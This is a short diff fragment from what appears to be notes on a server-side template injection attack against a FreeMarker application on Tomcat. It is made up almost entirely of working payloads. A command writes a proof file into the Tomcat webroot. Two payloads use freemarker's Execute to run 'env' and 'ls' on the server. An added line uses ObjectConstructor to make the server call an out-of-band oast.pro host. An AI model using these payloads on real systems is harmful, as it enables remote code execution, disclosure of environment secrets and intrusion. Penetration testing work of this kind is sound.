@@ -85,3 +85,5 @@ printf '%s' 'echo "ssti-webroot-proof $(hostname) $(date +%s)" > /usr/local/tomc
 
 [E1] ${'freemarker.template.utility.Execute'?new()('env')}
 [E2] ${'freemarker.template.utility.Execute'?new()('ls -la /usr/src/myapp')}
+
+${'freemarker.template.utility.ObjectConstructor'?new()('java.net.URL','http://XXXXXXXX.oast.pro/').getContent()}
